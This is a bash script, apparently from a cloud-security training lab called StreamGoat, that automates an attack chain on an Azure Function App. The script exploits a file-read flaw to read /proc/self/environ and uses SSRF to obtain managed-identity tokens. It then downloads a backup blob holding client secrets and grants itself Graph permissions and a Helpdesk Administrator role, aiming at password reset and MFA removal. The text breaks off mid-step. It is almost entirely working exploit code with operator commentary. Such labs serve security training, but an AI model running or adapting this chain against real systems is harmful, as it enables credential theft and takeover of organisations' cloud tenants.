#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          StreamGoat - Scenario 2                ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Exploit LFI on Function App\n"
  printf "  • Step 2. Harvest Managed Identity Token (SSRF)\n"
  printf "  • Step 3. Enumerate Storage Accounts\n"
  printf "  • Step 4. Download Backup Blob with Credentials\n"
  printf "  • Step 5. Authenticate as App Registration\n"
  printf "  • Step 6. Privilege Escalation (GA + Password Reset + MFA Removal)\n"
  printf "  • Step 7. Verify Access as Compromised User\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Collect inputs
#############################################
printf "\n"
read -r -p "Enter target URL: " FUNC_URL
FUNC_URL="${FUNC_URL%/}"  # Remove trailing slash

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Exploit LFI/RCE on Function App
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit LFI/SSRF on Function App  ===" "${RESET}"

step "Testing Function App connectivity"

spin_start "Checking if Function App is reachable"
set +e
HEALTH_CHECK="$(curl -sS -o /dev/null -w "%{http_code}" "${FUNC_URL}/api/FileReader" 2>/dev/null)"
set -e
spin_stop

if [ "$HEALTH_CHECK" != "200" ]; then
  err "Function App not reachable (HTTP $HEALTH_CHECK)"
  err "Ensure your IP is whitelisted and the function is deployed"
  exit 1
fi
ok "Function App is reachable"

step "Exploiting LFI to read /etc/hostname"

spin_start "Reading /etc/hostname"
set +e
LFI_RESP="$(curl -sS "${FUNC_URL}/api/FileReader?file=/etc/hostname")"
set -e
spin_stop

if echo "$LFI_RESP" | grep -q "FILE CONTENT"; then
  ok "LFI vulnerability confirmed!"
  info "Hostname: $(echo "$LFI_RESP" | tail -1)"
else
  err "LFI exploit failed"
  echo "$LFI_RESP"
  exit 1
fi

step "Reading environment variables via /proc/self/environ"

spin_start "Extracting environment"
set +e
ENV_RESP="$(curl -sS "${FUNC_URL}/api/FileReader?file=/proc/self/environ" | tr '\0' '\n')"
set -e
spin_stop

ok "Environment variables extracted"

# Extract IDENTITY_ENDPOINT and IDENTITY_HEADER for SSRF
IDENTITY_ENDPOINT="$(echo "$ENV_RESP" | grep "^IDENTITY_ENDPOINT=" | cut -d'=' -f2-)"
IDENTITY_HEADER="$(echo "$ENV_RESP" | grep "^IDENTITY_HEADER=" | cut -d'=' -f2-)"

if [ -z "$IDENTITY_ENDPOINT" ] || [ -z "$IDENTITY_HEADER" ]; then
  err "Failed to extract Managed Identity environment variables"
  info "Available env vars:"
  echo "$ENV_RESP" | grep -E "^(IDENTITY_|MSI_)" | head -5
  exit 1
fi

ok "Managed Identity credentials extracted"
info "IDENTITY_ENDPOINT: ${IDENTITY_ENDPOINT}"
info "IDENTITY_HEADER: ${IDENTITY_HEADER:0:20}..."

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We exploited a Local File Inclusion (LFI) vulnerability in the Azure Function App.\n"
printf "By reading /proc/self/environ, we extracted critical environment variables:\n\n"
printf "  • ${MAGENTA}IDENTITY_ENDPOINT${RESET}: Internal URL for the Managed Identity token service\n"
printf "  • ${MAGENTA}IDENTITY_HEADER${RESET}: Secret header value required for MI authentication\n\n"
printf "Azure Functions running with a Managed Identity expose these values in their\n"
printf "environment. Combined with an SSRF vulnerability, this allows us to request\n"
printf "tokens as the Function App's identity without direct network access to IMDS.\n\n"

read -r -p "Step 1 completed. Press Enter to continue (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Harvest Managed Identity Token (via SSRF)
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Harvest Managed Identity Token  ===" "${RESET}"

step "Using SSRF to request ARM token from Managed Identity endpoint"

# Build the token URL for ARM resource
ARM_TOKEN_URL="${IDENTITY_ENDPOINT}?api-version=2019-08-01&resource=https://management.azure.com/"

spin_start "Fetching ARM token via SSRF"
set +e
ARM_TOKEN_RESP="$(curl -sS -G "${FUNC_URL}/api/FileReader" \
  --data-urlencode "url=${ARM_TOKEN_URL}" \
  --data-urlencode "header_name=X-IDENTITY-HEADER" \
  --data-urlencode "header_value=${IDENTITY_HEADER}")"
set -e
spin_stop

# Extract the token from response
ARM_TOKEN="$(echo "$ARM_TOKEN_RESP" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)"

if [ -z "$ARM_TOKEN" ]; then
  err "Failed to obtain ARM token"
  echo "$ARM_TOKEN_RESP"
  exit 1
fi

ok "ARM token obtained successfully"
info "Token (first 50 chars): ${ARM_TOKEN:0:50}..."

step "Fetching Storage token via SSRF"

STORAGE_TOKEN_URL="${IDENTITY_ENDPOINT}?api-version=2019-08-01&resource=https://storage.azure.com/"

spin_start "Fetching Storage token"
set +e
STORAGE_TOKEN_RESP="$(curl -sS -G "${FUNC_URL}/api/FileReader" \
  --data-urlencode "url=${STORAGE_TOKEN_URL}" \
  --data-urlencode "header_name=X-IDENTITY-HEADER" \
  --data-urlencode "header_value=${IDENTITY_HEADER}")"
set -e
spin_stop

STORAGE_TOKEN="$(echo "$STORAGE_TOKEN_RESP" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)"

if [ -z "$STORAGE_TOKEN" ]; then
  err "Failed to obtain Storage token"
  exit 1
fi

ok "Storage token obtained successfully"

step "Checking Managed Identity role assignments"

# Extract subscription and resource group from env vars for role check
SUBSCRIPTION_ID="$(echo "$ENV_RESP" | grep "^WEBSITE_OWNER_NAME=" | cut -d'=' -f2 | cut -d'+' -f1)"
RESOURCE_GROUP="$(echo "$ENV_RESP" | grep "^WEBSITE_RESOURCE_GROUP=" | cut -d'=' -f2)"

# Get the principal ID from the ARM token
MI_PRINCIPAL_ID="$(echo "$ARM_TOKEN" | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq -r '.oid // empty' 2>/dev/null)"

if [ -n "$MI_PRINCIPAL_ID" ] && [ -n "$SUBSCRIPTION_ID" ]; then
  spin_start "Querying role assignments"
  set +e
  ROLE_ASSIGNMENTS_RESP="$(curl -sS -H "Authorization: Bearer ${ARM_TOKEN}" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'${MI_PRINCIPAL_ID}'")"
  set -e
  spin_stop
  
  ROLE_COUNT="$(echo "$ROLE_ASSIGNMENTS_RESP" | jq '.value | length // 0')"
  ok "Found ${ROLE_COUNT} role assignment(s) for Managed Identity"
  
  printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "🔑 Managed Identity Azure RBAC Roles" "${RESET}"
  printf "%s\n" "---------------------------------------------------------------------"
  
  # Extract and display role assignments with scope
  echo "$ROLE_ASSIGNMENTS_RESP" | jq -r '.value[]? | "\(.properties.roleDefinitionId | split("/") | last) @ \(.properties.scope | split("/") | last)"' 2>/dev/null | while read -r assignment; do
    ROLE_DEF_ID="$(echo "$assignment" | cut -d'@' -f1 | tr -d ' ')"
    SCOPE="$(echo "$assignment" | cut -d'@' -f2 | tr -d ' ')"
    
    # Get role name from role definition
    ROLE_NAME_RESP="$(curl -sS -H "Authorization: Bearer ${ARM_TOKEN}" \
      "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleDefinitions/${ROLE_DEF_ID}?api-version=2022-04-01" 2>/dev/null)"
    ROLE_NAME="$(echo "$ROLE_NAME_RESP" | jq -r '.properties.roleName // "Unknown"')"
    
    printf "  • %s%s%s (scope: %s)\n" "${GREEN}" "${ROLE_NAME}" "${RESET}" "${SCOPE}"
  done
  
  printf "%s\n" "---------------------------------------------------------------------"
else
  info "Could not determine Managed Identity principal ID for role check"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Using Server-Side Request Forgery (SSRF), we made the Function App call its own\n"
printf "internal Managed Identity endpoint on our behalf.\n\n"
printf "We obtained two OAuth tokens:\n"
printf "  • ${MAGENTA}ARM token${RESET}: Grants access to Azure Resource Manager APIs\n"
printf "  • ${MAGENTA}Storage token${RESET}: Grants access to Azure Blob Storage APIs\n\n"
printf "The Managed Identity's Azure RBAC roles determine what we can do with these tokens.\n"
printf "In this scenario, the MI has:\n"
printf "  • Reader on Resource Group — enumerate resources\n"
printf "  • Storage Blob Data Reader — read blob contents\n\n"
printf "This combination allows us to discover and access storage accounts within the RG.\n\n"

read -r -p "Step 2 completed. Press Enter to continue (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Enumerate Storage Accounts
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Enumerate Storage Accounts  ===" "${RESET}"

step "Extracting resource context from environment"

if [ -z "$SUBSCRIPTION_ID" ] || [ -z "$RESOURCE_GROUP" ]; then
  err "Failed to extract subscription/resource group from environment"
  exit 1
fi

ok "Found subscription: ${SUBSCRIPTION_ID}"
ok "Found resource group: ${RESOURCE_GROUP}"

step "Enumerating storage accounts in resource group"

spin_start "Listing storage accounts"
set +e
STORAGE_RESP="$(curl -sS -H "Authorization: Bearer ${ARM_TOKEN}" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01")"
set -e
spin_stop

STORAGE_ACCOUNTS="$(echo "$STORAGE_RESP" | jq -r '.value[].name')"
STORAGE_COUNT="$(echo "$STORAGE_RESP" | jq '.value | length')"

ok "Found ${STORAGE_COUNT} storage account(s)"

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "📦 Storage Accounts" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
echo "$STORAGE_RESP" | jq -r '.value[] | "  • \(.name) (\(.location))"'
printf "%s\n" "---------------------------------------------------------------------"

# Find the streamgoat storage account
TARGET_STORAGE="$(echo "$STORAGE_RESP" | jq -r '.value[] | select(.name | startswith("streamgoat2")) | .name')"

if [ -z "$TARGET_STORAGE" ]; then
  err "Could not find streamgoat storage account"
  exit 1
fi

ok "Target storage account identified: ${TARGET_STORAGE}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "With the ARM token, we queried Azure Resource Manager to list storage accounts\n"
printf "within the resource group. We discovered a 'streamgoat' storage account.\n\n"
printf "In real-world attacks, developers often store sensitive data in storage accounts:\n"
printf "  • Application configuration files\n"
printf "  • Backup files containing credentials\n"
printf "  • Connection strings and API keys\n"
printf "  • Database exports\n\n"
printf "The Storage Blob Data Reader role on the Managed Identity allows us to read\n"
printf "any blob in this storage account.\n\n"

read -r -p "Step 3 completed. Press Enter to continue (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Download Backup Blob with Credentials
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Download Backup Blob  ===" "${RESET}"

step "Listing containers in storage account"

spin_start "Enumerating blob containers"
set +e
CONTAINERS_RESP="$(curl -sS -H "Authorization: Bearer ${STORAGE_TOKEN}" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_STORAGE}.blob.core.windows.net/?comp=list")"
set -e
spin_stop

ok "Containers enumerated"
info "Found containers:"
echo "$CONTAINERS_RESP" | grep -oP '(?<=<Name>)[^<]+' | while read -r container; do
  printf "    • %s\n" "$container"
done

step "Listing blobs in 'backups' container"

spin_start "Enumerating blobs"
set +e
BLOBS_RESP="$(curl -sS -H "Authorization: Bearer ${STORAGE_TOKEN}" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_STORAGE}.blob.core.windows.net/backups?restype=container&comp=list")"
set -e
spin_stop

ok "Blobs enumerated"
info "Found blobs:"
echo "$BLOBS_RESP" | grep -oP '(?<=<Name>)[^<]+' | while read -r blob; do
  printf "    • %s\n" "$blob"
done

step "Downloading app_backup_info.txt"

spin_start "Downloading backup file"
set +e
BACKUP_CONTENT="$(curl -sS -H "Authorization: Bearer ${STORAGE_TOKEN}" \
  -H "x-ms-version: 2020-10-02" \
  "https://${TARGET_STORAGE}.blob.core.windows.net/backups/app_backup_info.txt")"
set -e
spin_stop

ok "Backup file downloaded!"

printf "\n%s%s%s\n" "${BOLD}${RED}" "🔑 LEAKED CREDENTIALS" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
echo "$BACKUP_CONTENT"
printf "%s\n" "---------------------------------------------------------------------"

# Extract credentials (strip whitespace and carriage returns)
LEAKED_CLIENT_ID="$(echo "$BACKUP_CONTENT" | grep "^CLIENT_ID=" | cut -d'=' -f2 | tr -d '\r\n\t ')"
LEAKED_CLIENT_SECRET="$(echo "$BACKUP_CONTENT" | grep "^CLIENT_SECRET=" | cut -d'=' -f2 | tr -d '\r\n\t ')"
LEAKED_TENANT_ID="$(echo "$BACKUP_CONTENT" | grep "^TENANT_ID=" | cut -d'=' -f2 | tr -d '\r\n\t ')"

if [ -z "$LEAKED_CLIENT_ID" ] || [ -z "$LEAKED_CLIENT_SECRET" ]; then
  err "Failed to extract credentials from backup file"
  exit 1
fi

ok "Credentials extracted successfully"
info "Client ID: ${LEAKED_CLIENT_ID}"
info "Tenant ID: ${LEAKED_TENANT_ID}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered a backup file containing credentials for an Azure AD App Registration:\n"
printf "  • ${MAGENTA}CLIENT_ID${RESET}: Application (client) ID\n"
printf "  • ${MAGENTA}CLIENT_SECRET${RESET}: Client secret for authentication\n"
printf "  • ${MAGENTA}TENANT_ID${RESET}: Azure AD tenant identifier\n\n"
printf "These credentials allow us to authenticate as the application itself using\n"
printf "the OAuth2 client_credentials flow. Unlike user tokens, application tokens\n"
printf "carry the permissions (app roles) assigned to the app's service principal.\n\n"
printf "This is a classic lateral movement technique: initial access via Function App\n"
printf "vulnerability leads to credential theft and pivoting to a more privileged identity.\n\n"

read -r -p "Step 4 completed. Press Enter to continue (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Authenticate as App Registration
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Authenticate as App Registration  ===" "${RESET}"

step "Obtaining Graph API token using stolen credentials"

spin_start "Authenticating to Microsoft Graph"
set +e
GRAPH_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${LEAKED_CLIENT_ID}" \
  -d "client_secret=${LEAKED_CLIENT_SECRET}" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" \
  "https://login.microsoftonline.com/${LEAKED_TENANT_ID}/oauth2/v2.0/token")"
set -e
spin_stop

GRAPH_TOKEN="$(echo "$GRAPH_TOKEN_RESP" | jq -r '.access_token')"

if [ -z "$GRAPH_TOKEN" ] || [ "$GRAPH_TOKEN" = "null" ]; then
  err "Failed to obtain Graph token"
  echo "$GRAPH_TOKEN_RESP" | jq .
  exit 1
fi

ok "Graph API token obtained"

step "Verifying token permissions"

spin_start "Checking service principal permissions"
set +e
SP_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -G "https://graph.microsoft.com/v1.0/servicePrincipals" \
  --data-urlencode "\$filter=appId eq '${LEAKED_CLIENT_ID}'")"
set -e
spin_stop

SP_OBJECT_ID="$(echo "$SP_RESP" | jq -r '.value[0].id // empty')"

if [ -z "$SP_OBJECT_ID" ]; then
  err "Failed to find Service Principal for app: ${LEAKED_CLIENT_ID}"
  info "Response was:"
  echo "$SP_RESP" | jq .
  exit 1
fi

ok "Service Principal Object ID: ${SP_OBJECT_ID}"

# Check app role assignments and extract Microsoft Graph SP ID
spin_start "Enumerating app role assignments"
set +e
APPROLE_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_OBJECT_ID}/appRoleAssignments")"
set -e
spin_stop

# Function to translate app role ID to human-readable name
get_role_name() {
  case "$1" in
    "06b708a9-e830-4db3-a914-8e69da51d44f") echo "AppRoleAssignment.ReadWrite.All" ;;
    "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8") echo "RoleManagement.ReadWrite.Directory" ;;
    "741f803b-c850-494e-b5df-cde7c675a1ca") echo "User.ReadWrite.All" ;;
    "50483e42-d915-4231-9639-7fdb7fd190e5") echo "UserAuthenticationMethod.ReadWrite.All" ;;
    "19dbc75e-c2e2-444c-a770-ec69d8559fc7") echo "Directory.ReadWrite.All" ;;
    "62a82d76-70ea-41e2-9197-370581804d09") echo "Group.ReadWrite.All" ;;
    "df021288-bdef-4463-88db-98f22de89214") echo "User.Read.All" ;;
    "7ab1d382-f21e-4acd-a863-ba3e13f7da61") echo "Directory.Read.All" ;;
    "98830695-27a2-44f7-8c18-0c3ebc9698f6") echo "GroupMember.ReadWrite.All" ;;
    *) echo "Unknown ($1)" ;;
  esac
}

ok "Current app role assignments (Graph API permissions):"
if echo "$APPROLE_RESP" | jq -e '.value[0]' >/dev/null 2>&1; then
  echo "$APPROLE_RESP" | jq -r '.value[]? | .appRoleId' 2>/dev/null | while read -r role_id; do
    role_name="$(get_role_name "$role_id")"
    printf "  • %s%s%s\n" "${GREEN}" "${role_name}" "${RESET}"
  done
else
  info "No app role assignments found"
fi

# Extract Microsoft Graph SP ID from existing assignment (resourceId points to MS Graph SP)
MSGRAPH_SP_ID="$(echo "$APPROLE_RESP" | jq -r '.value[0].resourceId // empty')"

if [ -n "$MSGRAPH_SP_ID" ]; then
  ok "Microsoft Graph SP ID (from assignment): ${MSGRAPH_SP_ID}"
else
  info "Could not extract MS Graph SP ID from assignments - will try alternative method"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We authenticated to Microsoft Graph API as the stolen App Registration.\n"
printf "The application has a critical permission:\n\n"
printf "  • ${RED}AppRoleAssignment.ReadWrite.All${RESET}\n\n"
printf "This permission allows the app to grant ANY Microsoft Graph permission to\n"
printf "ANY service principal in the tenant — including itself!\n\n"
printf "This is one of the most dangerous permissions in Azure AD because it enables:\n"
printf "  1. Self-escalation: Grant ourselves more powerful permissions\n"
printf "  2. Directory role assignment: Assign directory roles like Global Admin\n"
printf "  3. Full tenant compromise with sufficient chaining\n\n"
printf "Microsoft Graph permissions reference:\n"
printf "  https://learn.microsoft.com/en-us/graph/permissions-reference\n\n"

read -r -p "Step 5 completed. Press Enter to continue (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Privilege Escalation to Global Administrator
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Privilege Escalation to Global Administrator  ===" "${RESET}"

step "Phase 1: Grant RoleManagement.ReadWrite.Directory to self"

# If we didn't get MSGRAPH_SP_ID from assignments, we can't proceed with this method
if [ -z "$MSGRAPH_SP_ID" ]; then
  err "Cannot determine Microsoft Graph service principal ID"
  info "The app may not have any existing role assignments to extract the resourceId from"
  exit 1
fi

ok "Using Microsoft Graph SP ID: ${MSGRAPH_SP_ID}"

# RoleManagement.ReadWrite.Directory app role ID
ROLE_MGMT_ROLE_ID="9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"

info "Assigning RoleManagement.ReadWrite.Directory to service principal..."

spin_start "Creating app role assignment"
set +e
ASSIGN_RESP="$(curl -sS -X POST \
  -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"principalId\": \"${SP_OBJECT_ID}\",
    \"resourceId\": \"${MSGRAPH_SP_ID}\",
    \"appRoleId\": \"${ROLE_MGMT_ROLE_ID}\"
  }" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_OBJECT_ID}/appRoleAssignments")"
set -e
spin_stop

if echo "$ASSIGN_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to assign RoleManagement.ReadWrite.Directory"
  echo "$ASSIGN_RESP" | jq .
  info "This may mean the permission was already assigned or you lack AppRoleAssignment.ReadWrite.All"
else
  ok "RoleManagement.ReadWrite.Directory assigned!"
fi

# Also grant User.ReadWrite.All for password reset and MFA removal
USER_RW_ROLE_ID="741f803b-c850-494e-b5df-cde7c675a1ca"

info "Assigning User.ReadWrite.All to service principal..."

spin_start "Creating app role assignment for User.ReadWrite.All"
set +e
ASSIGN_RESP2="$(curl -sS -X POST \
  -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"principalId\": \"${SP_OBJECT_ID}\",
    \"resourceId\": \"${MSGRAPH_SP_ID}\",
    \"appRoleId\": \"${USER_RW_ROLE_ID}\"
  }" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_OBJECT_ID}/appRoleAssignments")"
set -e
spin_stop

if echo "$ASSIGN_RESP2" | jq -e '.error' >/dev/null 2>&1; then
  info "User.ReadWrite.All may already be assigned"
else
  ok "User.ReadWrite.All assigned!"
fi

# Grant UserAuthenticationMethod.ReadWrite.All for MFA removal
AUTH_METHOD_ROLE_ID="50483e42-d915-4231-9639-7fdb7fd190e5"

info "Assigning UserAuthenticationMethod.ReadWrite.All to service principal..."

spin_start "Creating app role assignment for UserAuthenticationMethod.ReadWrite.All"
set +e
ASSIGN_RESP3="$(curl -sS -X POST \
  -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{
    \"principalId\": \"${SP_OBJECT_ID}\",
    \"resourceId\": \"${MSGRAPH_SP_ID}\",
    \"appRoleId\": \"${AUTH_METHOD_ROLE_ID}\"
  }" \
  "https://graph.microsoft.com/v1.0/servicePrincipals/${SP_OBJECT_ID}/appRoleAssignments")"
set -e
spin_stop

if echo "$ASSIGN_RESP3" | jq -e '.error' >/dev/null 2>&1; then
  info "UserAuthenticationMethod.ReadWrite.All may already be assigned"
else
  ok "UserAuthenticationMethod.ReadWrite.All assigned!"
fi

# Wait for app permissions to propagate before using them for directory role assignment
info "Waiting for app permission propagation (15 seconds)..."
sleep 15

# Get fresh token with new app permissions
spin_start "Obtaining token with new app permissions"
set +e
GRAPH_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${LEAKED_CLIENT_ID}" \
  -d "client_secret=${LEAKED_CLIENT_SECRET}" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" \
  "https://login.microsoftonline.com/${LEAKED_TENANT_ID}/oauth2/v2.0/token")"
GRAPH_TOKEN="$(echo "$GRAPH_TOKEN_RESP" | jq -r '.access_token')"
set -e
spin_stop
ok "Fresh token obtained"

# Assign Helpdesk Administrator directory role to our service principal
# This is required for password reset operations (app permissions alone are not enough)
step "Phase 1b: Assign Helpdesk Administrator role to service principal"

# Helpdesk Administrator role template ID
# This role can reset passwords for non-admin users (was formerly called "Password Administrator")
HELPDESK_ADMIN_ROLE_TEMPLATE_ID="729827e3-9c14-49f7-bb1b-9608f156bbb8"

# Get all activated directory roles and find Helpdesk Administrator
spin_start "Getting Helpdesk Administrator directory role"
set +e
ALL_ROLES_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
  "https://graph.microsoft.com/v1.0/directoryRoles?\$select=id,roleTemplateId,displayName")"
set -e
spin_stop

# Filter client-side for the correct role template ID
HELPDESK_ADMIN_ROLE_ID="$(echo "$ALL_ROLES_RESP" | jq -r --arg tid "$HELPDESK_ADMIN_ROLE_TEMPLATE_ID" '.value[]? | select(.roleTemplateId == $tid) | .id // empty' | head -1)"

# Debug: show what roles we found
info "Looking for role template: ${HELPDESK_ADMIN_ROLE_TEMPLATE_ID}"

# If role doesn't exist/isn't activated, activate it first
if [ -z "$HELPDESK_ADMIN_ROLE_ID" ]; then
  info "Helpdesk Administrator role not activated, activating it now..."
  spin_start "Activating role"
  set +e
  ACTIVATE_HELPDESK_RESP="$(curl -sS -X POST \
    -H "Authorization: Bearer ${GRAPH_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{\"roleTemplateId\": \"${HELPDESK_ADMIN_ROLE_TEMPLATE_ID}\"}" \
    "https://graph.microsoft.com/v1.0/directoryRoles")"
  set -e
  spin_stop
  
  # Check for error in activation response
  if echo "$ACTIVATE_HELPDESK_RESP" | jq -e '.error' >/dev/null 2>&1; then
    err "Failed to activate Helpdesk Administrator role:"
    echo "$ACTIVATE_HELPDESK_RESP" | jq .
  else
    HELPDESK_ADMIN_ROLE_ID="$(echo "$ACTIVATE_HELPDESK_RESP" | jq -r '.id // empty')"
    ACTIVATED_TEMPLATE="$(echo "$ACTIVATE_HELPDESK_RESP" | jq -r '.roleTemplateId // empty')"
    info "Activated role object ID: ${HELPDESK_ADMIN_ROLE_ID}"
    info "Activated role template ID: ${ACTIVATED_TEMPLATE}"
    # Wait for role activation to propagate
    info "Waiting for role activation to propagate (5 seconds)..."
    sleep 5
  fi
fi

# Verify we have the correct role object ID (not template ID)
if [ -n "$HELPDESK_ADMIN_ROLE_ID" ] && [ "$HELPDESK_ADMIN_ROLE_ID" = "$HELPDESK_ADMIN_ROLE_TEMPLATE_ID" ]; then
  err "Bug: Got template ID instead of role object ID, re-querying..."
  set +e
  ALL_ROLES_RESP="$(curl -sS -H "Authorization: Bearer ${GRAPH_TOKEN}" \
    "https://graph.microsoft.com/v1.0/directoryRoles?\$select=id,roleTemplateId,displayName")"
  HELPDESK_ADMIN_ROLE_ID="$(echo "$ALL_ROLES_RESP" | jq -r --arg tid "$HELPDESK_ADMIN_ROLE_TEMPLATE_ID" '.value[]? | select(.roleTemplateId == $tid) | .id // empty' | head -1)"
  set -e
fi

if [ -z "$HELPDESK_ADMIN_ROLE_ID" ]; then
  err "Failed to get/activate Helpdesk Administrator role"
  info "This may mean RoleManagement.ReadWrite.Directory hasn't propagated yet"
else
  ok "Helpdesk Administrator role ID: ${HELPDESK_ADMIN_ROLE_ID}"
  
  # Add our service principal to Helpdesk Administrator role
  info "Adding service principal to Helpdesk Administrator role..."
  
  spin_start "Assigning Helpdesk Administrator"
  set +e
  HELPDESK_ADMIN_ASSIGN_RESP="$(curl -sS -X POST \
    -H "Authorization: Bearer ${GRAPH_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "{
      \"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/${SP_OBJECT_ID}\"
    }" \
    "https://graph.microsoft.com/v1.0/directoryRoles/${HELPDESK_ADMIN_ROLE_ID}/members/\$ref")"
  set -e
  spin_stop
  
  if echo "$HELPDESK_ADMIN_ASSIGN_RESP" | jq -e '.error' >/dev/null 2>&1; then
    if echo "$HELPDESK_ADMIN_ASSIGN_RESP" | grep -q "already exist"; then
      ok "Service principal already has Helpdesk Administrator role"
    else
      err "Could not assign Helpdesk Administrator"
